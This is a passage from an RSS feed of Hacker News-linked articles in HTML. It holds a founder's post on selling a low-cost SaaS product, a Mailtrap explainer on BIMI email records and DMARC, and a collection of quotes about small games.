href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4bc6903c-6bbd-488c-b89f-516ba14a08a8_2057x3006.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F4bc6903c-6bbd-488c-b89f-516ba14a08a8_2057x3006.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/4bc6903c-6bbd-488c-b89f-516ba14a08a8_2057x3006.png&quot;,&quot;height&quot;:2128,&quot;width&quot;:1456,&quot;resizeWidth&quot;:546,&quot;bytes&quot;:348487,&quot;alt&quot;:&quot;\&quot;Land and Expand\&quot; sales strategy&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt="&quot;Land and Expand&quot; sales strategy"></a><figcaption>A “Land and Expand” strategy starts at the bottom of the org chart; then expands via growth mechanisms built into the product.</figcaption></figure></div><p>I know what you’re thinking - <em>all this sounds great on paper. But how are you so confident it will work?</em></p><p><strong>I’m not </strong>😳</p><p><strong>Honestly, I don’t even know if I’ll be able to “land”, much less expand</strong>.</p><h3>It’s time to test out my landing gear</h3><p>…so I don’t build a product that crashes and burns on the runway.</p><p><strong>In <a href="https://www.themvpsprint.com/p/how-and-when-to-acquire-saas-users">last week’s article</a>, I outlined my top-of-the-funnel strategy</strong> - how to get PM and EM eyeballs on <a href="https://www.hellohailey.io/">HelloHailey</a>.</p><p><strong>This week I’m focusing on the bottom of the funnel</strong> - converting those eyeballs into paid users.</p><p><strong>Here’s what that funnel looks like for a PM or EM:</strong></p><ol><li><p><strong>Discover</strong> through top-of-the-funnel distribution channels.</p></li><li><p><strong>Try for free</strong> with their team.</p></li><li><p><strong>Get value - </strong>signaled by high engagement and retention.</p></li><li><p><strong>Convert to paid tier</strong> - to unlock premium features or exceed maximum number of seats (users) in free tier.</p></li><li><p><strong>Expand </strong>- add more seats within their company.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F5d8f40ce-fff5-494d-b754-e0696f648de6_2329x2815.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F5d8f40ce-fff5-494d-b754-e0696f648de6_2329x2815.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/5d8f40ce-fff5-494d-b754-e0696f648de6_2329x2815.png&quot;,&quot;height&quot;:1760,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:308211,&quot;alt&quot;:&quot;HelloHailey user acquisition funnel&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt="HelloHailey user acquisition funnel"></a><figcaption>HelloHailey user acquisition funnel</figcaption></figure></div></li></ol><h4><strong>My go-to-market strategy fails if I can’t convert free users into paid users.</strong></h4><p>But I know very little about B2B purchasing processes for low-ticket ($25-$50 / month) SaaS products:</p><ol><li><p><em>Will users have to fight tooth and nail for approval?</em></p></li><li><p><em>Who has a company credit card?</em></p></li><li><p><em>What budget will the money come from?</em></p></li></ol><p>To avoid this suc-SaaS story turning into a dis-SaaS-ter (🙄 sorry, couldn’t resist), <strong>I’m going to invest a few days now into understanding what the purchasing process will look like.</strong></p><h2>💰 How low-ticket SaaS products get purchased</h2><p>I probed into my network of EMs and PMs for answers. </p><p><em>Big shoutout to all those who helped me! </em>🙏</p><p>It turns out that my fears of a long chain of approvals with stringent criteria were unfounded.</p><h3><strong>The approval and purchase process is just two steps:</strong></h3><h4>1. Ask a manager</h4><p>Approval is loose and informal. PMs and EMs briefly mention it to their managers over email or their regular check-in.</p><p>Managers won’t require much justification for approval. Why? Its an immaterial amount of money and they trust their employees’ judgment.</p><h4>2. Find a credit card</h4><p>With very few exceptions, PMs and EMs (at the levels I’m targeting) don’t have company credit cards. So how do they pay after getting approval?</p><h5>Pay with personal credit card</h5><p>This is a common practice for team meals, social events, and one-off software purchases. A senior team member will pay with a personal card and file an expense report.</p><p>But people are more hesitant to pay for a <em><strong>recurring</strong></em> team subscription with a personal card.</p><h5>Find a company credit card</h5><p>This varies from company to company, but the most common places people go are:</p><ol><li><p><strong>Finance</strong> (manages budgets)</p></li><li><p><strong>IT</strong> (manages access to company subscriptions)</p></li><li><p><strong>Lowest person above them in the org chart with a company card</strong> (usually a Director or VP, depending on company size)</p></li></ol><h2>😁 Why my strategy will work</h2><h5>✅  Loose approval process</h5><p>I mentioned this before, but it’s worth restating. <strong>This means that the PM or EM using <a href="https://www.hellohailey.io/">HelloHailey</a> is the primary decision maker.</strong></p><p>No bureaucracy. No long, complex sales cycles.</p><p><strong>I just need to build a great product.</strong></p><h5>✅  Fits into an existing budget</h5><p>It’s my hypothesis that teams will pay for HelloHailey using their team “social” budgets. These budgets cover expenses like meals, games, or team events.</p><h5>✅  Takes a small percentage of that budget</h5><p>Team social budgets range from $10-$100 / person / month, with a median somewhere in the middle.</p><p>With a price of $2-$3 / person / month, HelloHailey would eat up only 5% of that budget on average.</p><h5>✅  Social budgets have been underutilized with sudden shift to remote work</h5><p>Half the people I talked to haven’t used their social budgets at all since being forced into remote work.</p><p>Most of the other half has used it sparingly for virtual team events.</p><h2>😢 Why it might not work</h2><p>Until companies <em>actually</em> start paying me, my strategy will be full of uncertainty.</p><p>Here are some ways it might fail:</p><h5>💩  Doesn’t fit into an existing budget</h5><p>Maybe companies don’t think it’s appropriate to pull from team social budgets for this kind of purchase.</p><p>If it doesn’t fit nicely into <em>any</em> existing category, it’ll be much harder for companies to buy it.</p><h5>💩  Hard to budget for a product with expanding price</h5><p><a href="https://www.hellohailey.io/">HelloHailey</a> will get more expensive as more users and teams are added within a company. </p><h5>💩  <strong>What happens when a product purchased with Team A’s social budget adds users from Team B and gets more expensive? </strong></h5><p>I don’t know 🤷‍♂️ (<em>Do you? <a href="https://twitter.com/AnotherTimJones">Share your wisdom and help me out</a> </em>🙂 ).</p><p>But I’m not the first person to face this problem. There are precedents in place and I’m confident I’ll figure it out.</p><h5>💩  Approval process is more difficult than expected</h5><p>The people I interviewed could be outliers. Maybe a typical manager requires more convincing to approve this kind of purchase.</p><h2>What about expanding?</h2><p>I now feel confident about landing. <strong>So how will I expand?</strong></p><p>I have some ideas for how I can build growth mechanisms into a product like this.</p><p>But if I’m being honest, I’m not sure yet 🤷‍♂️. And I’m OK with that.</p><p><strong>With a successful “land” strategy, and low to moderate expansion revenue, I can build a great business.</strong></p><p>Intra-company virality would be a must if I wanted to become a VC-backed rocket ship.</p><p><strong>But that’s not my goal.</strong></p><p><strong>I want to build a small, profitable company that solves a problem I’m passionate about.</strong></p><p>I can sell to unicorns. But I don’t want to <em>become</em> one.</p><h2>What did I get wrong?</h2><p>I learned a lot this week, but I’ve never done this before. </p><p><strong>Do you have SaaS sales experience?</strong></p><p>Don’t pull your punches! Help me out on my Twitter thread:</p><p>Don’t have any tips for me? <strong>Maybe you could help me out with a like or a retweet.</strong></p><p><strong>As a solopreneur with no funding or income, I’ll take all the help I can get 😁</strong></p><h2>🤔 Reducing uncertainty one week at a time</h2><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fcac3da08-e921-4064-b421-eebf46ef563b_920x248.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fcac3da08-e921-4064-b421-eebf46ef563b_920x248.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/cac3da08-e921-4064-b421-eebf46ef563b_920x248.png&quot;,&quot;height&quot;:248,&quot;width&quot;:920,&quot;resizeWidth&quot;:490,&quot;bytes&quot;:29061,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd00e39b8-5136-450c-b442-675c0cd2fd7f_478x184.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd00e39b8-5136-450c-b442-675c0cd2fd7f_478x184.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d00e39b8-5136-450c-b442-675c0cd2fd7f_478x184.png&quot;,&quot;height&quot;:184,&quot;width&quot;:478,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:23531,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>I’m finally feeling confident about my go-to-market strategy. Now it’s time to define the product I’ll be going to market with…</p><p><strong>Over the next two weeks, I’ll define my product vision and finalize requirements for an MVP (minimum viable product).</strong></p><p><strong>Curious to find out what I’ll be building?</strong> </p><p>I’ll tell you next Monday:</p><p data-attrs="{&quot;url&quot;:&quot;https://www.themvpsprint.com/subscribe&quot;,&quot;text&quot;:&quot;Send me next week's update&quot;,&quot;class&quot;:null}"><a href="https://www.themvpsprint.com/subscribe"><span>Send me next week's update</span></a></p><p><em>I’ll be documenting my startup journey from idea to paying users over the coming weeks and months. I’d love to have you along for the ride.</em></p><p><em>Icons made by&nbsp;<a href="https://www.freepik.com/">Freepik</a>,&nbsp;<a href="https://www.flaticon.com/authors/icongeek26">Icongeek26</a>, and&nbsp;<a href="https://www.flaticon.com/authors/pixel-perfect">Pixel perfect</a>&nbsp;from&nbsp;<a href="https://www.flaticon.com/">Flaticon</a></em></p></div></div>]]>
            </description>
            <link>https://www.themvpsprint.com/p/selling-to-unicorns-from-my-parents</link>
            <guid isPermaLink="false">hacker-news-small-sites-25188716</guid>
            <pubDate>Mon, 23 Nov 2020 16:53:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Do Your Emails Need BIMI?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25188559">thread link</a>) | @todsacerdoti
<br/>
November 23, 2020 | https://blog.mailtrap.io/bimi-email/ | <a href="https://web.archive.org/web/*/https://blog.mailtrap.io/bimi-email/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2526">
	<div>
		<!-- .entry-header -->

		<div>
			
<p>Here we go again. Just when you figured out what all these weird abbreviations (DKIM, SPF, DMARC) are, one more pops up on the horizon. Weren’t you safe enough already? Weren’t the spoofers, seeing your robust DNS records, quietly running away? Not all of them. The bad news is that you need to become familiar with the new kids on the block –&nbsp; BIMI records. Good news – we’ve got them covered for you. Read on!<br></p>



<h2><span id="What_is_a_BIMI_Record">What is a BIMI Record?</span></h2>



<p>BIMI stands for <strong>Brand Indicator for Message Identification</strong>. It’s a new approach that aims to prevent spoofing attempts but also increases the credibility of email senders. When fully implemented, hackers will have a very hard time trying to impersonate brands in emails, and maybe in a lot of other places too.<br></p>



<p><strong>A BIMI record is a DNS TXT record indicating what a brand’s logo is</strong>. When properly certified and authenticated, brands will be able to display their logo next to each message in an inbox, just like in the example below.<br></p>



<figure><img data-attachment-id="2551" data-permalink="https://blog.mailtrap.io/bimi-email/bimi-before-after/" data-orig-file="https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?fit=1360%2C680&amp;ssl=1" data-orig-size="1360,680" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="BIMI-before-after" data-image-description="" data-medium-file="https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?fit=300%2C150&amp;ssl=1" data-large-file="https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?fit=640%2C320&amp;ssl=1" loading="lazy" width="1360" height="680" src="https://i1.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?fit=640%2C320&amp;ssl=1" alt="" srcset="https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?w=1360&amp;ssl=1 1360w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=900%2C450&amp;ssl=1 900w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=1280%2C640&amp;ssl=1 1280w" sizes="(max-width: 640px) 100vw, 640px" data-lazy-srcset="https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?w=1360&amp;ssl=1 1360w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=900%2C450&amp;ssl=1 900w, https://i2.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?resize=1280%2C640&amp;ssl=1 1280w" data-lazy-src="https://i1.wp.com/blog.mailtrap.io/wp-content/uploads/2019/12/BIMI-before-after.png?fit=640%2C320&amp;ssl=1&amp;is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure><p>When it’s well adopted and more logos start popping up in inboxes, users will be able to quickly spot when something’s not right. They’ll also learn to recognize the brand they know and like, coming with obvious benefits for the companies. We will cover more about that later.<br></p>



<p>BIMI email authentication is developed as an open standard and it is possible that not only email clients will adopt it. Among the most likely candidates, messaging and social media apps are mentioned. Companies present there could also benefit from additional security. The platforms will probably be eager to get verified accounts on board. BIMI records could make a lot of difference.<br></p>



<p>We’ll see how it all plays out. At the time of writing (Dec. 2019), BIMI is in a pilot stage with Verizon Media Group (Yahoo!, AOL). Google recently also <a href="https://www.prnewswire.com/news-releases/google-joins-authindicators-working-group-and-commits-to-bimi-pilot-300890074.html" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">announced that they will be trialing BIMI in 2020.</a> If everything works out as expected, we can see BIMI records being adopted more in the coming years.<br></p>



<h2><span id="What_are_the_requirements_to_join_the_BIMI_club">What are the requirements to join the BIMI club?</span></h2>



<p>For BIMI to work, several conditions need to be met:</p>



<ul><li>The sender’s domain needs to be DMARC-authenticated, with either ‘reject’ or ‘quarantine’ policy set up</li><li>The domain’s owner needs to obtain the right certification</li><li>A good sending history needs to be built</li></ul><p>Let’s discuss these conditions one-by-one.<br></p>



<h3><span id="Be_DMARC-certified">Be DMARC-certified</span></h3>



<p>We already discussed DMARC on our blog, but if you wish to read more about it, check out our <a href="https://blog.mailtrap.io/dmarc-explained/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">DMARC Explained</a> article, along with our tips on <a href="https://blog.mailtrap.io/dmarc-setup/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">how to set up DMARC record</a>.<br></p>



<p>Long story short, DMARC is an authentication method that works on top of SPF and/or DKIM.<br></p>



<p><a href="https://blog.mailtrap.io/spf-records-explained/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">SPF</a> is used to specify which IP addresses are allowed to send emails on behalf of a given domain. <a href="https://blog.mailtrap.io/dkim/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">DKIM</a>, on the other hand, allows incoming servers to verify the headers and body of a message, so that they look just like they did when they were leaving the sender’s inbox.</p>



<p>DMARC runs either check (or both) and performs a separate domain alignment test for the methods used. Finally, a policy assigned with DMARC can suggest an incoming server if emails that fail a test should be:</p>



<ul><li>Reject -&gt; discarded and not delivered to the recipient’s inbox</li><li>Quarantine -&gt; sent to the spam folder</li><li>None -&gt; treated as though no check was made (good for testing)</li></ul><p>As we mentioned earlier, to qualify for BIMI, the policy needs to be set to either ‘quarantine’ or ‘reject’. Of course, the DMARC record needs to be properly configured.<br></p>



<p>DMARC doesn’t require both DKIM and SPF to be set up (though it’s a smart thing to do). For the BIMI record to have any effect, either of these methods should be in place, along with DMARC, of course. A check will be performed every time a message is due to be delivered, so it’s worth triple-checking if everything is intact.<br></p>



<h3><span id="Obtain_a_certification">Obtain a certification</span></h3>



<p>To add an additional layer of security, bodies governing BIMI, referred to as Mark Verifying Authorities (MVA), will ask for additional proof of domain ownership.&nbsp;<br></p>



<p>To get in, you’ll need to obtain an <a href="https://en.wikipedia.org/wiki/Extended_Validation_Certificate" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">EV (Extended Validation) certificate</a> and meet several additional requirements:</p>



<ul><li>Prove the ownership or the right to use a registered trademark</li><li>Have this trademark registered in a competent jurisdiction</li><li>Make sure the logo from the BIMI record matches the trademark</li><li>Assure the owner of a trademark is also a registrant of a given domain name (alternative, those using a trademark under a license must be registered as licensees of a domain)</li></ul><p>Only if all of these conditions are met, the MVA will proceed to issue a respective certification.<br></p>



<p>Keep in mind that these rules may change at any point. CNN was the first company to obtain a certificate from MVA and <a href="https://martechtoday.com/cnn-com-receives-first-verified-mark-certificate-in-preparation-for-bimi-email-standard-236255" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">it happened only in October 2019</a>. Before the program is rolled out to the public, the rules will likely be re-evaluated a number of times and some tweaks might be introduced. We’ll do our best to update this article if any of these happen.<br></p>



<h3><span id="Maintain_a_good_sending_history">Maintain a good sending history</span></h3>



<p>The last requirement is rather vague, but is important to keep in mind. In order to qualify for BIMI, you’ll need to have a good sending reputation, both for your domain and IP address.&nbsp;<br></p>



<p>This means having a healthy, engaged list of subscribers. Of course, you should avoid <a href="https://blog.mailtrap.io/soft-vs-hard-bounce/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">email bounces</a> and spam reports, but the fact that your emails are regularly opened by the recipients will also play a significant role.&nbsp;<br></p>



<p>You also will need to have a track record of sending a significant volume of emails. Smaller senders may also be granted access to BIMI at some point but for now, only bigger brands will have a shot.</p>



<div data-id="1" data-render-id="0" data-tracking="enabled" data-intro="no_animation" data-sub-type="shortcode"><div><div><div><div><div><div><div><p><span>Join our newsletter</span><span>Only the best content, delivered once a month. Unsubscribe anytime.</span></p></div></div></div></div></div></div></div></div>



<h2><span id="How_to_implement_BIMI_records">How to implement BIMI records?</span></h2>



<p>Once you meet all the requirements and obtain respective certifications, you can go on and add a proper record to your Domain Name System (DNS).<br></p>



<p>Then, you’ll need to upload your logo, necessarily in SVG format to a public HTTPS address. It’s recommended that it’s square-shaped and transparent. You may also want to avoid any unnecessary text as the logo displayed will be really small, making reading nearly impossible.<br></p>



<p>Finally, you will add a TXT record for <em>default._bimi.DomainAddress</em> in the following format: </p>



<pre><code>v=BIMI1; l=logoURL;</code></pre>



<p>For example, for Mailtrap it could be:</p>



<pre><code>v=BIMI1; l=https://www.mailtrap.io/logo123.svg;</code></pre>



<p>(it’s not really a valid address but if you wish to use our logo, let us know!)<br></p>



<p>That’s all. If you’re approved into the program and everything was configured properly, you should see the first effects within a few days.<br></p>



<h2><span id="Where_can_BIMI_authentication_make_a_difference">Where can BIMI authentication make a difference?</span></h2>



<p>When talking about BIMI authentication and its impact, the first thing that comes up is email security. After all, that’s precisely what BIMI record was introduced for. We also can’t underestimate the marketing impact it can have on brands. Let’s talk about these two aspects.<br></p>



<h3><span id="Security_impact">Security impact</span></h3>



<p>While DKIM and SPF help prevent spoofing, skillful fraudsters can bypass these measures, especially if only one of them is set up. DMARC is much more difficult, as domain alignment is also checked. Chances are someone will pass through.<br></p>



<p>That’s when BIMI comes very handy. Most users don’t check email addresses of the senders and email clients don’t display them right away. Instead, all users see is the display name of a sender, sometimes with company initials.<br></p>



<p>This can be easily spoofed. <strong>When a BIMI record is in place, a brand’s missing logo may raise a yellow flag </strong>for those used to seeing the branding displayed for each email.<br></p>



<p>Popularizing BIMI will also directly <strong>impact the adoption rate of DMARC</strong>. Even after several years since the release, most companies still don’t use this technology and, according to <a href="https://www.agari.com/insights/ebooks/2018-q4-report/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Agari’s research</a>, only 8% of Fortune 500 companies have ‘reject’ or ‘quarantine’ policies in place. All the others are vulnerable to attacks, most of which can be easily prevented with the more sophisticated tools.<br></p>



<p>It’s in the best interest of both users and email service providers to drive the adoption of DMARC. BIMI has a chance to finally move the numbers in the right direction.<br></p>



<h3><span id="Marketing_impact">Marketing impact</span></h3>



<p>BIMI implementation can have a major impact on marketing efforts. Since BIMI is and will be free to participate in, brands will get <strong>free exposure with almost no effort</strong>. Users will learn to recognize their logos right on the spot.<br></p>



<p>Emails signed with logos will also <strong>build users’ trust</strong>, especially if the content that follows is valuable. They will certainly feel safer opening emails from familiar sources.<br></p>



<p>BIMI will likely expand at some point to other forms of online communication. Those that participate will be able to continuously develop brand awareness and quickly gain recognition.<br></p>



<p>Since the BIMI logo for an email is fetched from a DNS every time a message is delivered, <strong>rebranding will also run smoother than it usually does</strong>. All it will take is updating an SVG file in the domain’s DNS and changes will be applied with the next email delivered.<br></p>



<h2><span id="Wrapping_up">Wrapping up</span></h2>



<p>All of this sounds really exciting and we’ll be watching closely how this all evolves. Many companies will surely take advantage of this opportunity and once the pilots wrap up, many more will follow their steps.&nbsp;<br></p>



<p>Chances are that a few years from now, we’ll be looking suspiciously at emails coming in without company logos. Or who knows, maybe a completely different approach will take over by then and change the way we think about email authentication.<br></p>



<p>Whether you’re eligible for the program or not, you likely have a vital interest in making your emails better, and rightly so. On the Mailtrap blog, we write a lot about email authentication and other related topics. We share tips for improving your campaigns and warn of the mistakes many marketers make. Explore our blog and become an email testing expert in no time!<br></p>
		<!-- END .ss-inline-share-wrapper -->
					
		</div><!-- .entry-content -->

		<!-- .entry-footer -->
	</div>
</article></div>]]>
            </description>
            <link>https://blog.mailtrap.io/bimi-email/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25188559</guid>
            <pubDate>Mon, 23 Nov 2020 16:39:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Small Games]]>
            </title>
            <description>
<![CDATA[
Score 192 | Comments 88 (<a href="https://news.ycombinator.com/item?id=25188542">thread link</a>) | @polm23
<br/>
November 23, 2020 | https://lorenzo.itch.io/on-small-games | <a href="https://web.archive.org/web/*/https://lorenzo.itch.io/on-small-games">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>I wanted to write a Small Games Manifesto for the Manifesto Jam, but I&nbsp;was too tired, so I collected&nbsp;other people's thoughts about small games instead.</em></p>

<p><em>See also: <a href="http://ebeth.itch.io/small-games-manifesto" target="_blank">Small Games Manifesto</a> by Ebeth.</em><br></p>

<p><em>Looking for some small games to play? Check out my <a href="https://itch.io/c/6160/small-is-beautiful" target="_blank">Small is Beautiful</a> and&nbsp;<a href="https://itch.io/c/232207/bitsy-faves-pt2-20192020" target="_blank">Bitsy Faves</a>&nbsp;collections.</em></p>

<p><em>Follow me on Twitter <a href="https://twitter.com/LorenzoPilia" target="_blank" rel="nofollow noopener">@LorenzoPilia</a></em></p>

<p>• • • • •</p>

<p>Make short and intense games:<br>think haiku, not epic.<br>Think poetry, not prose.<br><strong>— Auriea Harvey &amp; Michaël Samyn: Realtime Art Manifesto</strong><br><a href="http://tale-of-tales.com/tales/RAM.html" rel="nofollow noopener">http://tale-of-tales.com/tales/RAM.html</a></p>

<p>• • • • •<br></p>

<p>things i will never do in this lifetime:&nbsp;<br>play a game for a few straight hours<br>play a game with more than a few hours worth of content<br><strong>— @moshboy</strong><br><a href="https://twitter.com/moshboy/status/607408540496465922" rel="nofollow noopener">https://twitter.com/moshboy/status/607408540496465922</a></p>

<p>• • • • •<br></p>

<p>Hell, you'd be surprised at how many people buy games with a moderate length and never finish them. On PC over 50 percent of the people who bought the latest Wolfenstein, a game you can beat in under 15 hours, never earned the achievement for finishing the story. Only 31 percent of Dishonored players on the PC beat the game. People think game length is mandatory, but even shorter games aren't finished by the majority of players.
<br><strong>— Ben Kuchera: To hell with longer games, tell me how SHORT your game is</strong><br><a href="https://www.polygon.com/2014/10/14/6974791/short-games-review" rel="nofollow noopener">https://www.polygon.com/2014/10/14/6974791/short-games-review</a></p>

<p>• • • • •<br></p>

<p>Especially if you're starting out, try to do small projects and don't worry too much about polishing them, don't worry about shipping the perfect game, embrace the messiness of getting into games for the first time, embrace not knowing what you're doing exactly yet. (...) If you just put your heart into it in that way, and embrace the messiness of small games, people will really connect with that.<br><strong>— Nina Freeman: Keynote at A MAZE. / Johannesburg 2017<br></strong><a href="https://twitter.com/AMazeFest/status/908032352953217038" rel="nofollow noopener">https://twitter.com/AMazeFest/status/908032352953217038</a></p>

<p>• • • • •<br></p>

<p>Duration doesn't need to be a burden. It can be a tool to wield.<br><strong>— Thomas McMullan: Inside and the rise of short games</strong><br><a href="http://www.alphr.com/games/1003958/inside-and-the-rise-of-short-games" rel="nofollow noopener">http://www.alphr.com/games/1003958/inside-and-the-rise-of-short-games</a></p>

<p>• • • • •<br></p>

<p>Small-scale works are often derided for feeling embryonic or unfinished, throwaway motifs or fledgling ideas that the artist failed to integrate into a sufficiently ambitious whole. Game designer Jake Elliott, who drew the title of his Ruins from Schumann’s appraisal of Chopin’s preludes, defended their proportion in an interview: “Maybe [Chopin] felt like they were complete objects, but there wasn’t a vocabulary for talking about pieces of music that were short at the time. Their length is what drew me … there is a lot that’s unspoken.” Having conventionally privileged length, magnitude, and formal unity, games too have left critics bereft of a clear rubric for evaluating intentionally abbreviated, serialized, even disorderly exercises in interactive design.<br><strong>— Peter Lido: Undertale, one year later</strong><br><a href="https://killscreen.com/articles/undertale-one-year-later/" rel="nofollow noopener">https://killscreen.com/articles/undertale-one-year-later/</a></p>

<p>• • • • •<br></p>

<p>The final idea that we brought over as gamers, the final idea that we had to let go of, was that a longer game makes a better game. We felt that the sense of completion and catharsis that you get when you watch our ending was so critical to the experience, that we decided that we had to help as many people as possible to complete Monument Valley. And that was more important than making the game longer or more difficult.<br><strong>— Ken Wong: Games Without Gamers (#DICE2014 Europe)</strong><br><a href="http://youtu.be/YdSClYHDow0?t=13m37s" rel="nofollow noopener">https://youtu.be/YdSClYHDow0?t=13m37s</a></p>

<p>• • • • •<br></p>

<p>I value games being short, it makes them easier to fit into life, they get to the point sooner, it's possible to play them more times, trying out different possibilities, there's a clearer connection between decisions and outcome.<br><strong>— Michael Brough: imbroglio notes 6 - meditation</strong><br><a href="http://mightyvision.blogspot.de/2016/08/imbroglio-notes-6-meditation.html?m=1" rel="nofollow noopener">http://mightyvision.blogspot.de/2016/08/imbroglio-notes-6-meditation.html?m=1</a></p>

<p>• • • • •<br></p>

<p>Small games must be protected from their own defenders!! They must be defended against a rhetoric of convenience, as if fitting helpfully into the meagre free time allotted us by rentiers was something to be proud of rather than something to grind against - they must be defended against the meagre virtues of "minimalism", parsimony, elegance, the values of those with enough cultural cachet that they can afford to speak softly, and which hold the same relation to an actual human economy of wants and needs as does a millionaire who doesn't tip.<br><strong>— thecathamites: Small Game Manifesto (part of&nbsp;Buttertown, 10 manifestos for groups of no people)</strong><br><a href="https://thecatamites.itch.io/buttertown">https://thecatamites.itch.io/buttertown</a></p>


</div></div>]]>
            </description>
            <link>https://lorenzo.itch.io/on-small-games</link>
            <guid isPermaLink="false">hacker-news-small-sites-25188542</guid>
            <pubDate>Mon, 23 Nov 2020 16:38:27 GMT</pubDate>
        </item>
        <item>
            <title>
